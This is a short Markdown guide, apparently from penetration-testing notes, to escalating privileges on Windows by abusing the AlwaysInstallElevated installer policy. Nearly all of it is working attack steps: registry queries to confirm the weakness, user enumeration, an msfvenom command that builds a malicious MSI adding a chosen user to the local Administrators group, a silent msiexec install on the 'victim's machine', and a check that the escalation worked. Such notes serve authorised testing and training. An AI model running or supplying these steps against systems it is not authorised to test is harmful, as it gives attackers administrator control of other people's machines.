# AlwaysInstallElevated: Privilege Escalation

**MSI packages** can be installed with **elevated privileges** for non-admin users.

1. Verify whether the Windows installer has elevated privileges or not

        reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

    “AlwaysInstallElevated” registry with a dword (REG_WORD) value of **0x1** means that the AlwaysInstallElevated policy is enabled.

2. Select a non-admin user

        net user
        net user USERNAME

3. Generate an MSI payload to add local admin privileges for an existing non-admin user account

        msfvenom -p windows/exec CMD='net localgroup administrators USERNAME /add' -f msi > pwn.msi

4. [Transfer the payload](../../windows_post_exploitation/file_transfer_smbserver/README.md) to victim's machine
5. Execute the installer

        msiexec /quiet /qn /i pwn.msi

6. Verify if the selected user was successfully added to Local Administrators group

        net user USERNAME

    You should see the following output:

        ...
        Local Group Memberships      *Administrators
        ...

## References

* https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
* https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
* https://docs.microsoft.com/en-us/windows/win32/msi/command-line-options